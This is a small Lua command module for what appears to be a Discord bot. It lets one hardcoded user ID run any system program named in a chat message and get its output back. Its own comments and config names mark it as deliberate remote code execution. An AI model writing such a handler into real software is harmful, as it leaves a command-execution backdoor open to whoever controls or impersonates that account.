-- dont ask why this is here
-- you can safely remove this in production

local module = {}

local spawn = require("coro-spawn")
local config = require("/src/config")

local priviliged = {

	["325106358460612608"] = true

}

function module.run(message, arguments)
	local length = #arguments
	local command = arguments[3]

	if priviliged[message.author.id] then
		local args = {}

		for i = 4, length do
			table.insert(args, arguments[i])
		end

		local child = spawn(arguments[3], {
			args = args,
			stdio = {nil, true, 2}
		})

		if child then
			for chunk in child.stdout.read do
				message:reply(tostring(chunk))
		
				break
			end
		else
			config.kill(string.format(config.rce_error, message.author.username))
		end
	else
		config.kill(string.format(config.rce_unauth, message.author.username))
	end
end

return module